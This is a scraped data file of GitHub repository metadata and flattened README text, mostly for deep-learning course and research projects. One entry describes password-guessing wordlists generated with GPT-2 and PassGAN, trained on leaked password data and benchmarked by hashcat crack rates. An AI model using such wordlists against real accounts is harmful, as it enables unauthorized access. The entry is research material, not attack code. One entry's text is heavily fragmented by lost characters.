D https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master QuantumcircuitoptimizationwithDeeplearning ipynb 1 What is circuit optimization https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master QuantumcircuitoptimizationwithDeeplearning ipynb 2 How does optimized circuit looks like depends on hardware https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master Checkhowcircuitoptimizeddependsonquantumbackend ipynb 3 Check quantum hardware information https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master hardwareinformation ipynb 4 How to generate random circuit https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master RandomquantumcircuitGenerator ipynb 5 Generate dataset for Deep learning https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master Generatedataset ipynb 6 Train LSTM Autoencoder to find circuit manifold https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master LSTMAutoencoder ipynb 6 1 Optional Predicting statevectors from circuits https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master predictingstatevectorsfromcircuits ipynb Check out our experiment log showing results from many experiments we ran to validate this statevector prediction model experiment log https docs google com spreadsheets d 1LPAHmYtP5d9qKSbEQmxlSk6NTAQU2ytRe82e3c6dVQ edit 7 Train Layout predicting Model https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master layoutprediction ipynb 8 Train Optimized circuit predicting model https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master Optimizedcircuitgenerator ipynb 9 How to check it is optimized https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master QuantumcircuitoptimizationwithDeeplearning ipynb What Deep learning model is used 1 LSTM Autoencoder Find circuit latent space manifold 2 LSTM Encoder DNN Predict the layout 3 LSTM seq2seq Predict transpiler level 3 Optimized quantum circuit 4 DNN Optional Predicting the statevector from circuit,2019-12-13T14:56:23Z,2019-12-15T01:05:58Z,Jupyter Notebook,IllgamhoDuck,User,2,1,0,72,master,IllgamhoDuck#abnf,2,0,0,0,0,0,0
xavihart,Classifying-MNIST-by-Non-deep-Learning-Methods,n/a,Classifying MNIST by Non deep Learning Methods For EE369 Project,2019-11-04T16:18:52Z,2019-11-04T16:25:14Z,Python,xavihart,User,1,1,0,2,master,xavihart,1,0,0,0,0,0,0
krantirk,Stanford-TensorFlow-for-Deep-Learning-Research.,n/a,License https img shields io badge license MIT blue svg LICENSE Join the https gitter im stanford tensorflow tutorials https badges gitter im tflearn tflearn svg https gitter im stanford tensorflow tutorials stanford tensorflow tutorials This repository contains code examples for the course CS 20 TensorFlow for Deep Learning Research It will be updated as the class progresses Detailed syllabus and lecture notes can be found here http cs20 stanford edu For this course I use python3 6 and TensorFlow 1 4 1 For the code and notes of the previous year s course please see the folder 2017 and the website https web stanford edu class cs20si 2017 For setup instruction and the list of dependencies please see the setup folder of this repository,2019-12-01T08:57:53Z,2019-12-02T18:24:38Z,Python,krantirk,User,1,1,0,0,master,,0,0,0,4,0,4,2
SunnyHong36,Keras2.2.5-Tensorflow_gpu1.14.0,n/a,Keras2 2 5 Tensorflowgpu1 14 0 Using Keras to Practice Deep Learning with GPU Accelerate under Window10 Tensorflow gpu 20191128tensorflow gpu anaconda6GPUTensorflow TF KerasTensorflow2 02 0Keras 2 0CUDAcuDNNKerasTFgithubhttps github com tensorflow tensorflow blob master RELEASE md TF CSDN1 51 8 1 14 01 151 151 x 2 1 14TFKerasKerastensorflowpytorchTF 1 Anaconda Anacondapandas numpy matplotlib scipyconda conda create n tfenv python 3 5 tfen python 3 5 3 5python conda env list conda info env conda activate tfenv conda deactivate 2 tensorflow gpu ipackage pkg package pip install i https pypi tuna tsinghua edu cn simple tensorflow gpu 1 14 0 pipconda install conda installpiptensorflow gpuconda install kerastensorflow gpuconda listpypibuildpyxx build 3 GPUCUDAcuDNN 20CUDAcuDNN GPUTF 1 NVIDIAGPUNCUDA3 5N https developer nvidia com cuda gpus NVIDIA 2 TFCUDAcuDNNhttps developer nvidia com cuda toolkit archive https developer nvidia com rdp cudnn archive TF https www tensorflow org tensorflow https tensorflow google cn Build from source Windows Build from source GPUTF GPUTFCUDAcuDNN 1 13 0CUDA9cuDNN7 Additional setup GPU support GPU support GPU drivers CUDA10 0410 xNVIDIA 441 41 CUDA Toolkit CUDATF1 13 0CUDA10 0CUDA9 Tensorflowgithub CUDA CUPTI CUDA cuDNN SDK 7 4 1 cuDNN7 4 1 TensorRT 5 0 1 14 0TFCUDA10 0 CUDA https developer nvidia com cuda toolkit archive CUDA 10 0localnetwork cuDNN https developer nvidia com rdp cudnn archive CUDA10 0cuDNN7 6 47 6 0 cuDNN CUDACUDAOther componentsDriver components CUDAVisual StudioVisual Studio VSVisual Studio 2015CUDA NVIDIA CUDACUDANVIDIA 3D NVCUDA10 2 95TF10 0CUDACUDACUDATFCUDACUDATFC CUDA CUDA CUDA CUDA9 29 210 0 cuDNNcuDNNCUDAcuDNNCUDA cuDNN CUDA TFTF Path TFTF Path GPU conda activate tfenv python python tensorflow import tensorflow as tf tf test gpudevicename deviceGPU GPU CUDA NVIDIA NVIDIA PhysX 9 19 0218 NVIDIA GeForce Experience 3 20 1 57NVIDIA 441 41 CUDA CUDACUDAcuDNN https www huorong cn 360360 Keras Keras https keras zh readthedocs io 2 2 5TF12 2 5keras pip Keras pip install i https pypi tuna tsinghua edu cn simple keras 2 2 5 pip install ignored installed upgrade pkg ignored installed upgrade Keras python import keras TF keras keras Jupyter notebookTensorflow GPUKeras 1 base conda install nvconda conda activate tfenv tfenv conda install y jupyter 2 ipykernel conda install n tfenv ipykernel conda activate tfenv python m ipykernel install user 3 ipykernel conda create n tfenv python 3 5 ipykernel jupyter notebook Jupyter notebookkeras Jupyter notebook,2019-11-28T03:14:06Z,2019-12-02T04:59:44Z,n/a,SunnyHong36,User,1,1,0,14,master,SunnyHong36,1,0,0,0,0,0,0
zxgx,cs231n-2019,n/a,CS231n 2019 My solution for the assignments of cs231n http cs231n github io in 2019 I have completed the first 2 assignments and the first 2 ipynbs which cover the implementation of RNN and LSTM in assignment 3 I do these assignments mainly for revising deep learning and uploading a neat version of my solution,2019-11-07T10:55:49Z,2019-11-12T03:14:55Z,Jupyter Notebook,zxgx,User,1,1,0,5,master,zxgx,1,0,0,9,0,9,0
ashishpatel26,Ml-Lessons,annotator#classification#cloud#deep-learning#google-colab#gpu#jupyter-notebook#lessons#medical-imaging#rsna-pneumonia-detection#semantic#xray#xray-engine,Introductory lessons to Deep Learning for medical imaging by MD ai https www md ai The following are several Jupyter notebooks covering the basics of downloading and parsing annotation data and training and evaluating different deep learning models for classification semantic and instance segmentation and object detection problems in the medical imaging domain The notebooks can be run on Google s colab with GPU see instruction below Lesson 1 Classification of chest vs adominal X rays using TensorFlow Keras Github https github com mdai ml lessons blob master lesson1 xray images classification ipynb Annotator https public md ai annotator project PVq9raBJ Lesson 2 Lung X Rays Semantic Segmentation using UNets Github https github com mdai ml lessons blob master lesson2 lung xrays segmentation ipynb Annotator https public md ai annotator project aGq4k6NW workspace Lesson 3 RSNA Pneumonia detection using Kaggle data format Github https github com mdai ml lessons blob master lesson3 rsna pneumonia detection kaggle ipynb Annotator https public md ai annotator project LxR6zdR2 workspace Lesson 3 RSNA Pneumonia detection using MD ai python client library Github https github com mdai ml lessons blob master lesson3 rsna pneumonia detection mdai client lib ipynb Annotator https public md ai annotator project LxR6zdR2 workspace Note that the mdai client requires an access token which authenticates you as the user To create a new token or select an existing token to go a specific MD ai domain e g public md ai register then navigate to the Personal Access Tokens tab on your user settings page to create and obtain your access token The MD ai Annotator The MD ai annotator is a powerful web based application to store and view anonymized medical images e g DICOM on the cloud create annotations collaboratively in real time and export annotations images and labels for training The MD ai python client library can be used to download images and annotations prepare the datasets and then used to train and evaluate deep learning models Further documentation and videos are available at https docs md ai MD ai Annotator Example Project URL https public md ai annotator project aGq4k6NW workspace MD ai python client libray URL https github com mdai mdai client py MD ai Annotator https docs md ai img annotatorhomepage png Running Jupyter notebooks Colab Its easy to run a Jupyter notebook on Google s Colab with free GPU use time limited For example you can add the Github jupyter notebook path to https colab research google com notebook Select the GITHUB tab and add the Lesson 1 URL https github com mdai ml lessons blob master lesson1 xray images classification ipynb To use the GPU in the notebook menu go to Runtime Change runtime type switch to Python 3 and turn on GPU See more colab tips https www kdnuggets com 2018 02 essential google colaboratory tips tricks html Advanced How to run on Google Cloud Platform with Deep Learning Images You can also run the notebook with powerful GPUs on the Google Cloud Platform In this case you need to authenticate to the Google Cloug Platform create a private virtual machine instance running a Google s Deep Learning image and import the lessons See instructions below GCP Deep Learnings Images How To runningongcp md copy 2018 MD ai Inc Licensed under the Apache License Version 2 0,2019-11-05T11:36:40Z,2019-11-11T12:45:00Z,Jupyter Notebook,ashishpatel26,User,1,1,0,138,master,tmoneyx01#anoukstein#georgeshih#transcranial,4,0,0,0,0,0,0
kannimuthu,MyDL-Experience,n/a,MyDL Experience My Experience with Deep Learning,2019-11-19T05:09:07Z,2019-11-20T09:46:37Z,Jupyter Notebook,kannimuthu,User,1,1,1,10,master,kannimuthu,1,0,0,0,0,0,0
anlan625,Learning-to-Rank-project,n/a,Learning to Rank project Course Project for COMSW4995 Deep Learning Columbia University It is widely recognized that the position of an item in the ranking has a crucial influence on its exposure and economic success However the algorithm widely used to learn the rankings does not lead to rankings that would be considered fair The goal is to find a method that not only maximizes utility to the users but also rigorously enforces merit based exposure constraints towards the items In the project we first apply some conventional methods on LTR Learning to Rank problems based on SVMRank Joachims et al 2009 RankNet Burges et al 2005 Furthermore we use a meta model to stack SVMRank and RankNet to enhance the result Beyond the theoretical evidence in deriving the framework and the algorithm we also provide empirical results on simulated and real world datasets verifying the effectiveness of the approach in individual and group fairness settings The files are specified as follow Data Use the link to download the file to data folder Files would be set1 test txt set1 train txt set1 valid txt set2 test txt set2 train txt set2 valid txt Output Prediction and saved models are in the folder SVMRank and RankNet SVMRank model1 the model trained by set1 train by SVMRank SVMRank model2 the model trained by set2 train by SVMRank SVMRank prediction1 txt the prediction of set1 test by SVMRank model1 SVMRank prediction2 txt the prediction of set2 test by SVMRank model2 RankNet set1 model the model trained by set1 train by RankNet RankNet set2 model the model trained by set2 train by RankNet RankNet prediction1 txt the prediction of set1 test by RankNet set1 model RankNet prediction2 txt the prediction of set2 test by RankNet set2 model Running Code nDCG ipynb the python code used to compute nDCG for predictions RankNetmain py the python code used to train RankNet and compute nDCG for predictions metadata py the python code used to generate meta data for stack model stack py the python code used to read in meta data of SVMRank and RankNet and train stacked model To generate the stacked model first use metadata py to get meta data from RankNet Then use svmdata py to get the split of folds of data to generate meta data for SVMRank Change the splitted data file form txt to dat Use the SVM package from cornell with the following code in order svmranklearn data model1train dat model1 svmrankclassify data subset3 dat model1 rstrain1 svmrankclassify data test dat model1 rstest1 svmranklearn data model2train dat model2 svmrankclassify data subset2 dat model2 rstrain2 svmrankclassify data test dat model2 rstest2 svmranklearn data model3train dat model3 svmrankclassify data subset1 dat model3 rstrain3 svmrankclassify data test dat model3 rstest3 Here we manually take the average of all rstest to get meta Y with name rsmetatestx txt and combine all rstrain to rnmetatrainx txt Then use stack py to train the stacked model Reference SVMRank code SVMRank implementation Reference http www cs cornell edu people tj svmlight svmrank html learning2rank ranking implementation Refernece https github com shiba24 learning2rank,2019-11-06T23:10:01Z,2019-12-04T20:05:52Z,C,anlan625,User,1,1,0,81,master,AlexYH-Chen#anlan625,2,0,0,0,0,0,0
Miguel-Jiahao-Wang,DeepPhoto,n/a,DeepPhoto Project This project is part of the course Deep Learning MSc Data Science for Business HEC Paris and Ecole Polytechnique Team members Ching yu Lin Fernado Perez Jorgen Lund Jiahao Wang Roberta Conard Usecase Design a mobile application prototype that allows users to do fine grained image editing in real time before uploading the social applications on their mobile phones Techniques We adapted the semantic segmentation technique RefineNet to identify the human part in images Then we use the neural style transfer to transfer the part of image that user selected For more details please see the slides Final Result We finetuned and pruned the RefineNet to our use case Our smallest model LightNet MobileNet acheived 0 809 mIoU with only 13MB size which outperforms the off the shelf DeepLabV3 0 806 mIoU 233MB in this specific task in terms of the quality size and inference speed First five images in testset Full pipeline examples Duration This project was conducted between 2019 Nov 05 and 2019 Nov 11 Reference The RefineNet model architecture is adapted from https github com ansleliu LightNet,2019-11-06T23:48:30Z,2019-11-12T10:33:39Z,Jupyter Notebook,Miguel-Jiahao-Wang,User,1,1,1,18,master,cv786324#Miguel-Jiahao-Wang#jorglund,3,0,0,1,0,1,0
shakasom,multilabel-landcover-deeplearning,n/a,Multi label Land Cover Classification with DeepLearning Multi label land cover classification is less explored compared to single label classifications In contrast multi label classifications are more realistic as we always find out multiple land cover in each image However with the Deep learning applications and Convolutional Neural Networks we can tackle the challenge of multilabel classifications In this tutorial we use the redesigned Multi label UC Merced dataset with 17 land cover classes UC Merced Land use dataset was initially introduced as one of the earliest satellite datasets for computer vision The UC Merced dataset is considered as the MNIST of satellite image dataset The original dataset consisted of 21 classes of single label classification,2019-11-25T16:23:29Z,2019-12-02T00:07:30Z,Jupyter Notebook,shakasom,User,2,1,0,3,master,shakasom,1,0,0,0,0,0,0
csuarez689,IA-2019,n/a,IA 2019 Practicos Machine Learning Deep Learning con Python 3,2019-12-15T00:25:53Z,2019-12-15T01:36:12Z,Jupyter Notebook,csuarez689,User,1,1,0,7,master,csuarez689,1,0,0,0,0,0,0
thanhhff,Introduction-to-TensorFlow,n/a,TensorFlow in Practice Introduction This repo contains all my work for this specialization All the code base quiz questions lecture note in TensorFlow in Practice on Coursera https www deeplearning ai tensorflow in practice,2019-11-15T14:41:08Z,2019-12-03T09:30:41Z,Jupyter Notebook,thanhhff,User,1,1,1,5,master,thanhhff,1,0,0,0,0,0,0
pirateshappy,Fashion-class-Classification,n/a,Fashion class Classification Machine Learning Fashion class classification Convolutional neural network deep learning This repository trains a neural network model to classify images of clothing like sneakers and shirts This repository uses tf keras a high level API to build and train models in TensorFlow This guide uses the Fashion MNIST dataset which contains 70 000 grayscale images in 10 categories The images show individual articles of clothing at low resolution 28 by 28 pixels as seen here,2019-11-24T20:53:41Z,2019-11-24T20:59:45Z,Jupyter Notebook,pirateshappy,User,1,1,0,3,master,pirateshappy,1,0,0,0,0,0,0
diegobonilla98,Audio-Digit-Recognizer,n/a,Audio Digit Recognizer Audio recognizer using Deep Learning convNets and transfer learning Personal approach to an Audio Recognizer project First I thought in using the spectrograms to get the audio info but it turned out in a big loss value and very low accuracy After deciding to use the raw wav data a 1D ConvNet worked faster and better than any RNN The working model audiomodel py reached a validation accuracy of over 80 and a validation loss 0 5 The architecture is a couple 1D convnets and transfered learning to two more dense layers Since the data is pretty complex the complexity of the model and the epochs are increased Turned out fine Cool project Learning curves The accuracy is on the left the loss is the one in the right Accuracy of the model acc png Loss of the model loss png,2019-11-03T20:56:34Z,2019-11-03T21:14:54Z,Python,diegobonilla98,User,1,1,0,11,master,diegobonilla98,1,0,0,0,0,0,0
wayexists02,parallel_dl,n/a,,2019-11-29T01:26:52Z,2019-11-30T14:42:24Z,CMake,wayexists02,User,1,1,0,1,master,wayexists02,1,0,0,0,0,0,0
veerathp,dl-mxnet-sagemaker-workshop,n/a,dl mxnet sagemaker workshop Content for Deep Learning MXNet amp SageMaker workshop,2019-11-21T02:23:03Z,2019-12-12T11:12:47Z,Jupyter Notebook,veerathp,User,4,1,0,7,master,veerathp,1,0,0,0,0,0,0
bhavikabagaria,Image-Recognition-using-CIFAR-10-Dataset,n/a,Image Recognition using CIFAR 10 Dataset The goal of the project is to understand and implement Image Recognition and Classification of the CIFAR 10 dataset using Convolutional Neural Networks CNNs The current industry baseline accuracy is 82 The aim is to try and match the accuracy and understand the nuances of building a Convolutional Neural Network The result is to identify the optimal parameters to achieve justifiable accuracy,2019-12-11T01:54:23Z,2019-12-11T02:05:28Z,Jupyter Notebook,bhavikabagaria,User,1,1,0,3,master,bhavikabagaria,1,0,0,0,0,0,1
ismal,DL-MSS,n/a,DL MSS Deep Learning followed by Moment Scaling Spectrum Jupyter notebooks Multiple State Generator MAMultipleStateGenerator ipynb Data processing script MADataProcessingUserFriendlyNEW ipynb Data files Trained model ModelBidirectionalNoShape3stateTr10000 Model Parameters ParametersModelBidirectionalNoShape3stateTr10000 txt Required python packages numpy scipy matplotlib seaborn ipywidgets Installation of ipywidgets and enabling of Initialization cells python pip install ipywidgets jupyter nbextension enable py widgetsnbextension pip install jupyternbextensionsconfigurator jupytercontribnbextensions jupyter contrib nbextension install user jupyter nbextensionsconfigurator enable user In the Jupiter notebook in the last tab Nbextensions the following extensions should be activated Initialization cells Activating Initialization Cells initcells png,2019-11-07T22:03:57Z,2019-11-21T10:09:49Z,Jupyter Notebook,ismal,User,2,1,0,12,master,ismal,1,0,0,0,0,0,0
rarecoil,ai-passwords,gpt2#hashcat#password-research#passwords,ai passwords This is a collection of password lists in which I have trained various deep learning algorithms to try to come up with passwords A full report of results exists in each directory Models Used All models are trained against the top 10 million passwords in all of the hashes org dataset https github com rarecoil hashes org list and then tested against the entire dataset for cracks vs running the wordlists in hashcat gpt2 small Using minimaxir s gpt 2 simple https github com minimaxir gpt 2 simple with GPT2 small and some of the hashes org https hashes org founds dataset PassGAN Brannon Dorsey s implementation https github com brannondorsey passgan of the generative adversarial network used in PassGAN A Deep Learning Approach for Password Guessing https arxiv org abs 1709 00440 The code is somewhat out of date so I made a Python3 TensorFlow 1 15 fork https github com rarecoil passgan Performance This table lists approximate performance metrics for these models Metrics are Model Name The model folder used to generate the password list Generated The amount of passwords generated by the model Unique The amount of unique passworss generated by the model In Training Set The amount of generated passwords that exist in the training dataset PW sec Approximate password generation per second raw Cracks sec Approximate novel passwords yielding cracks of the validation dataset per second Rig The computer specifications used for the experiment Model Name Generated Unique In Training Set PW sec Cracks Sec Rig gpt2 small 4 726 912 4 053 784 822 690 111 12 17 A1 PassGAN 4 999 168 4 658 237 454 759 84516 19726 01 A2 Rig Specifications This contains hardware specifications used to run the model Rig A1 thehaswell ROCm Intel Core i7 4790K Devil s Canyon 32GB DDR3 RAM 1 TB NVMe SSD Samsung 960 Evo Ubuntu 18 04 3 LTS ROCm 2 9 6 AMD Radeon VII VBIOS version 113 D3600200 106 Rig A2 thehaswell CUDA Intel Core i7 4790K Devil s Canyon 32GB DDR3 RAM 1 TB NVMe SSD Samsung 960 Evo Ubuntu 18 04 3 LTS CUDA 10 1 NVidia Geforce GTX 1070 Ti Founders Edition License MIT License,2019-11-13T05:52:36Z,2019-12-05T15:26:50Z,n/a,rarecoil,User,1,1,0,5,master,rarecoil,1,0,0,0,0,0,0
gyh75520,Relational_DRL,reinforcement-learning#rl#tensorflow,Implementation of Relational Deep Reinforcement Learning This Repository is implementation of Relational Deep Reinforcement Learning https arxiv org abs 1806 01830 to BoxWorld Environment The Reinforcement Learning Algorithm is A2C but it s very easy to change the base algorithm Requirements Python 3 6 1 Tensorflow 1 11 0 Tensorboard 1 11 0 OpenAI Gym 0 15 4 stable baselines https github com hill a stable baselines commit hash 98257ef8c9bd23a24a330731ae54ed086d9ce4a7a1ab7a1c2903e7e1c38756d8cdf7a54a5fd5781e Already exists in the project but you need to install the dependencies of stablebaselines The versions are just what I used and not necessarily strict requirements Install boxworld environment Go to the env gym box world folder and run the command pip install e This will install the box world environment Now you can use this enviroment with the following import gym import gymboxworld envname BoxRandWorld envid envname NoFrameskip v4 env gym make envid level easy More details about the Env https github com gyh75520 RelationalDRL blob master env gym box world README md How to Run All training code is contained within main py To view options simply run python main py help An example python main py BoxRandWorld envlevel easy RelationalLstmPolicy Experiment result BoxRandWorld level easy head 2 Training Curve Relation diagram The following is the relation attention weight diagram of the agent 0 Dark 1 White The greater the weight the more the color tends to be white gif BoxRandWorldEasy2 gif gif BoxRandWorldEasy3 gif gif concisecnnnotreduceObs gif,2019-11-12T13:01:47Z,2019-12-14T12:38:44Z,Python,gyh75520,User,1,1,0,43,master,gyh75520,1,0,0,0,0,0,0
ealmaraz,ConvNets,n/a,ConvNets Deep learning with Convoluted Neural Networks In this repository I implement some projects on Deep Learning using Convoluted Neural Networks 1 malariasgd Malaria Cell detection using ConvNets Image credits Centers for Disease Control and Prevention s Public Health Image Library Contact For comments suggestions etc feel free to contact me erickalmaraz gmail com,2019-11-24T19:27:48Z,2019-11-28T22:36:45Z,Jupyter Notebook,ealmaraz,User,1,1,1,46,master,ealmaraz,1,0,0,0,0,0,0
abhinavvsehgal,Recommendation-System-PyTorch-,n/a,Summary This dataset ml latest small describes 5 star rating and free text tagging activity from MovieLens http movielens org a movie recommendation service It contains 100836 ratings and 3683 tag applications across 9742 movies These data were created by 610 users between March 29 1996 and September 24 2018 This dataset was generated on September 26 2018 Users were selected at random for inclusion All selected users had rated at least 20 movies No demographic information is included Each user is represented by an id and no other information is provided The data are contained in the files links csv movies csv ratings csv and tags csv More details about the contents and use of all these files follows This is a development dataset As such it may change over time and is not an appropriate dataset for shared research results See available benchmark datasets if that is your intent This and other GroupLens data sets are publicly available for download at Usage License Neither the University of Minnesota nor any of the researchers involved can guarantee the correctness of the data its suitability for any particular purpose or the validity of results based on the use of the data set The data set may be used for any research purposes under the following conditions The user may not state or imply any endorsement from the University of Minnesota or the GroupLens Research Group The user must acknowledge the use of the data set in publications resulting from the use of the data set see below for citation information The user may redistribute the data set including transformations so long as it is distributed under these same license conditions The user may not use this information for any commercial or revenue bearing purposes without first obtaining permission from a faculty member of the GroupLens Research Project at the University of Minnesota The executable software scripts are provided as is without warranty of any kind either expressed or implied including but not limited to the implied warranties of merchantability and fitness for a particular purpose The entire risk as to the quality and performance of them is with you Should the program prove defective you assume the cost of all necessary servicing repair or correction In no event shall the University of Minnesota its affiliates or employees be liable to you for any damages arising out of the use or inability to use these programs including but not limited to loss of data or data being rendered inaccurate If you have any further questions or comments please email Citation To acknowledge use of the dataset in publications please cite the following paper F Maxwell Harper and Joseph A Konstan 2015 The MovieLens Datasets History and Context ACM Transactions on Interactive Intelligent Systems TiiS 5 4 19 119 19 Further Information About GroupLens GroupLens is a research group in the Department of Computer Science and Engineering at the University of Minnesota Since its inception in 1992 GroupLens s research projects have explored a variety of fields including recommender systems online communities mobile and ubiquitious technologies digital libraries local geographic information systems GroupLens Research operates a movie recommender based on collaborative filtering MovieLens which is the source of these data We encourage you to visit to try it out If you have exciting ideas for experimental work to conduct on MovieLens send us an email at we are always interested in working with external collaborators Content and Use of Files Formatting and Encoding The dataset files are written as comma separated values http en wikipedia org wiki Comma separatedvalues files with a single header row Columns that contain commas are escaped using double quotes These files are encoded as UTF 8 If accented characters in movie titles or tag values e g Misrables Les 1995 display incorrectly make sure that any program reading the data such as a text editor terminal or script is configured for UTF 8 User Ids MovieLens users were selected at random for inclusion Their ids have been anonymized User ids are consistent between ratings csv and tags csv i e the same id refers to the same user across the two files Movie Ids Only movies with at least one rating or tag are included in the dataset These movie ids are consistent with those used on the MovieLens web site e g id 1 corresponds to the URL Movie ids are consistent between ratings csv tags csv movies csv and links csv i e the same id refers to the same movie across these four data files Ratings Data File Structure ratings csv All ratings are contained in the file ratings csv Each line of this file after the header row represents one rating of one movie by one user and has the following format userId movieId rating timestamp The lines within this file are ordered first by userId then within user by movieId Ratings are made on a 5 star scale with half star increments 0 5 stars 5 0 stars Timestamps represent seconds since midnight Coordinated Universal Time UTC of January 1 1970 Tags Data File Structure tags csv All tags are contained in the file tags csv Each line of this file after the header row represents one tag applied to one movie by one user and has the following format userId movieId tag timestamp The lines within this file are ordered first by userId then within user by movieId Tags are user generated metadata about movies Each tag is typically a single word or short phrase The meaning value and purpose of a particular tag is determined by each user Timestamps represent seconds since midnight Coordinated Universal Time UTC of January 1 1970 Movies Data File Structure movies csv Movie information is contained in the file movies csv Each line of this file after the header row represents one movie and has the following format movieId title genres Movie titles are entered manually or imported from and include the year of release in parentheses Errors and inconsistencies may exist in these titles Genres are a pipe separated list and are selected from the following Action Adventure Animation Children s Comedy Crime Documentary Drama Fantasy Film Noir Horror Musical Mystery Romance Sci Fi Thriller War Western no genres listed Links Data File Structure links csv Identifiers that can be used to link to other sources of movie data are contained in the file links csv Each line of this file after the header row represents one movie and has the following format movieId imdbId tmdbId movieId is an identifier for movies used by E g the movie Toy Story has the link imdbId is an identifier for movies used by E g the movie Toy Story has the link tmdbId is an identifier for movies used by E g the movie Toy Story has the link Use of the resources listed above is subject to the terms of each provider Cross Validation Prior versions of the MovieLens dataset included either pre computed cross folds or scripts to perform this computation We no longer bundle either of these features with the dataset since most modern toolkits provide this as a built in feature If you wish to learn about standard approaches to cross fold computation in the context of recommender systems evaluation see LensKit http lenskit org for tools documentation and open source code examples,2019-12-09T12:12:22Z,2019-12-10T07:50:26Z,Jupyter Notebook,abhinavvsehgal,User,1,1,0,2,master,abhinavvsehgal,1,0,0,0,0,0,0
elichen,Feature-visualization,n/a,Feature visualization Deep learning CNN feature visualization a Pytorch port of https github com tensorflow lucid 0 png 1 png 2 png 3 png 4 png,2019-12-04T00:45:18Z,2019-12-15T01:36:07Z,Jupyter Notebook,elichen,User,2,1,0,33,master,elichen,1,0,0,0,0,0,0
ineventhorizon,K-Nearest-Neighbor-Classification,n/a,,2019-11-18T11:17:00Z,2019-11-18T11:23:21Z,Python,ineventhorizon,User,1,1,0,1,master,ineventhorizon,1,0,0,0,0,0,0
krantirk,Neural-Machine-Translation,n/a,CS224n Natural Language Processing with Deep Learning Stanford Winter 2019 My work on assignments and project in the course Course links Course page http web stanford edu class cs224n Lecture videos 2019 Youtube https www youtube com playlist list PLoROMvodv4rOhcuXMZkNm7j3fVwBBY42z,2019-12-02T04:04:40Z,2019-12-02T18:24:24Z,JavaScript,krantirk,User,1,1,0,14,master,chriskhanhtran,1,0,0,0,0,0,0
dcabatin,TTT,n/a,TTT Train Transform Translate Deep Learning Fall 2019 Final Project Group Big Brain Learning The Universal Transformer model can be found in universaltransformer py Scripts to process the data can be found in preprocess py The script to train the model is assignment py It produces two output files that can be used to compute BLEU scores using bleu sh Note that bleu sh requires the sacrebleu Python package which can be installed with pip install sacrebleu Included are sh files to download the necessary data,2019-11-14T22:08:49Z,2019-12-12T16:24:50Z,Python,dcabatin,User,4,1,0,39,master,marksg07#dcabatin#HomerW#dependabot[bot],4,0,0,0,0,0,4
hubertsiuzdak,voice-conversion,pytorch#voice-conversion#wavenet,,2019-12-09T22:04:00Z,2019-12-11T13:30:04Z,Cuda,hubertsiuzdak,User,3,1,0,5,master,hubertsiuzdak,1,0,0,0,0,0,0
hazemsamoaa,Seq2Seq-Deep-learning-model-for-Text-annotation,n/a,Seq2Seq Deep learning model for Text annotation This Project is about text annotation regarding the feeling extracted from micro text clip In this project we are trying to handle a micro text processing task using deep learning sequential model LSTM with word representation model like Word2vec to infer the feeling from the micro text This benchmark model works very fine with high accuracy 80 only for few epochs due to hardware limitation in our case But this model could be invested in many different text areas like tweets short news facebook comments and posts microblogs and finally Amazone product reviews etc This model is now under using to analyze and measure student satisfaction toward teaching exams and university life in Italy,2019-12-01T22:30:52Z,2019-12-02T13:52:03Z,Jupyter Notebook,hazemsamoaa,User,1,1,0,7,master,hazemsamoaa,1,0,0,0,0,0,0
Wolfteinter,Deep-Learning-Computer-Vision-CNN-OpenCV-YOLO-SSD-GANs,n/a,Deep Learning Computer Vision CNN OpenCV YOLO SSD GANs Cuadernos de el curso Deep Learning Computer Vision CNN OpenCV YOLO SSD GANs Las imagenes necesarias no estan anexadas No se muestra la ejecucion de todos los ejercicios,2019-11-06T18:05:14Z,2019-11-15T09:08:03Z,Jupyter Notebook,Wolfteinter,User,1,1,0,5,master,Wolfteinter,1,0,0,0,0,0,0
fengxiaolong886,A_survey_on_value_based_deep_reinforcement_learning,n/a,A survey on value based deep reinforcement learning Reinforcement learning RL address the problem of how to make a sequential decision in the real world It aims to maximize the total reward in the task In recent years deep learning is one of the attractive fields and it has pushed the limits of what was possible in the domain of Machine Learning and Artificial Intelligence Combine with RL and deep learning is a trendy field in the regime of artificial intelligence AI It named as deep RL It represents a step towards developing autonomous systems with a higher level understanding of the observed world There are various subfields for deep RL but the arise of deep RL should back to the DQN algorithm which is proposed by cite1 In this survey we begin with an introduction to the general field or deep RL then focus on value based deep RL which is one of the bases in deep RL Our survey will cover the central algorithm in the value based deep RL field We will review the latest research results and also recall the issue in value based method especially the problems in using function approximation for RL We hope to inspire novel research methods of the value based algorithm,2019-12-11T13:23:18Z,2019-12-13T01:10:37Z,n/a,fengxiaolong886,User,1,1,0,6,master,fengxiaolong886,1,0,0,0,0,0,0
MayurSatav,Colorization-of-image-using-opencv-and-deep-learning,n/a,Image Colorizatio With GUI Overview This repository contains bwtocolorgui exe Inferenceimagesdataset folder Output Screenshots folder Requirements Python 3 7 4 Tkinter PIL Numpy Open Cv Excecution Steps Step 1 Download models colorizationdeployv2 prototxt here https github com richzhang colorization blob master models colorizationdeployv2 prototxt colorizationreleasev2 caffemodel here https github com richzhang colorization blob master models fetchreleasemodels sh ptsinhull npy here https github com richzhang colorization blob master resources ptsinhull npy Step 2 Create model folder and Add all these models Step 3 Run bwtocolorgui py Screenshots bwtocolorgui https github com MayurSatav Colorization of image using opencv and deep learning blob master Output Screenshots Screenshot png References Richard Zhang https github com richzhang colorization For more details on the image colorization refer to the official publication of Zhang http richzhang github io colorization,2019-11-28T17:35:13Z,2019-12-01T19:16:38Z,Python,MayurSatav,User,1,1,0,10,master,MayurSatav,1,0,0,0,0,0,0
